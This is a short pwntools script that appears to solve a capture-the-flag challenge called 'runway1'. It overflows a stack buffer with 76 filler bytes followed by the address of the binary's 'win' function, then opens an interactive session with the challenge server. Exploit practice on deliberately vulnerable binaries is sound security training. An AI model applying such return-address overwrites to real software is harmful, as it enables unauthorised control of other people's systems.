#!/usr/bin/env python3

from pwn import *

exe = ELF("./runway1")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13401)

    return r


def main():
    r = conn()

    r.sendlineafter(b'food?\n', 
        b'A'*76 + 
        p32(exe.symbols.win)
    )

    r.interactive()


if __name__ == "__main__":
    main()
